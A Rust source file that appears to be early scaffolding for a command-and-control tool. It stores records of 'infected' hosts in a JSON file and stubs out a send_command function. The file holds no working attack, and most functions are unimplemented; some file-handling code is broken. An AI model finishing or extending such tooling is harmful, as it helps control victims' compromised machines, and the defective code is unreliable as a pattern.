use std::{fs, io::{BufReader, Read}, net::Ipv4Addr, path::PathBuf, str::FromStr};

use anyhow::Error;
use serde::{Deserialize, Serialize};
use thiserror::Error;
use dirs::config_dir;
use uuid::Uuid;

use crate::{domains::infected::{self, HostName, Infected, InfectedId, InfectedIpAddr}, interface::app::App, repos::database::{InfectedDatabaseError, InfectedRepo}};

pub fn get_infected_all() -> Vec<Infected> {
    todo!()
}

pub fn create_infected(infected: &Infected, database: impl InfectedRepo) -> Result<(), InfectedDatabaseError> {
    database.add_infected(infected)
}

pub fn get_infected(id: InfectedId) -> Infected {
    todo!()
}

#[derive(Error, Debug, Deserialize, Serialize, Clone, Copy)]
#[error("Command could not execute")]
pub struct CommandExecutionError;

pub fn send_command(command: crate::domains::command::Command, target: Infected) -> Result<(), CommandExecutionError> {
    todo!()
}

pub struct InfectedDatabase {
    file: &'static str
}

impl InfectedDatabase {
    pub fn new(&self) -> Self {
        Self { file: "infected.json" }
    }

    fn save_infected(&self, infected_vec: &Vec<Infected>) -> Result<(), InfectedDatabaseError> {
        todo!()
    }
}


impl InfectedRepo for InfectedDatabase {
    fn add_infected(&self, infected: &Infected) -> Result<(), InfectedDatabaseError> {

        let mut config_path: PathBuf = match dirs::config_dir() {
            Some(path) => path,
            None => {
                return Err(InfectedDatabaseError::NotFound);
            }
        };

        config_path.push(self.file);

        let _ = fs::create_dir_all(&config_path).map_err(|_e| InfectedDatabaseError::NotFound);
        let data = serde_json::to_string(&infected).unwrap();
        fs::write(config_path, data).map_err(|_e| InfectedDatabaseError::NotFound)

    }

    fn get_all_infected(&self) -> Option<Vec<Infected>> {
        let file = fs::File::open(self.file);
        let mut buf_reader = BufReader::new(file.unwrap());
        let mut contents = String::new();
        let _ = buf_reader.read_to_string(&mut contents).map_err(|e| InfectedDatabaseError::NotFound);

        let infected_vec: Vec<Infected> = serde_json::from_str(&contents).unwrap();

        Some(infected_vec)
    }

    fn get_infected(&self, uuid: Uuid) -> Option<Infected> {
        let infected_vec = self.get_all_infected();
        match infected_vec {
            Some(infected_vec) => {
                return infected_vec.iter().find(|i| i.id.get() == uuid).cloned()
            }
            None => None
        }        
    }

    fn remove_infected(&self, uuid: Uuid) -> Result<(), InfectedDatabaseError> {
        todo!()
    }
}

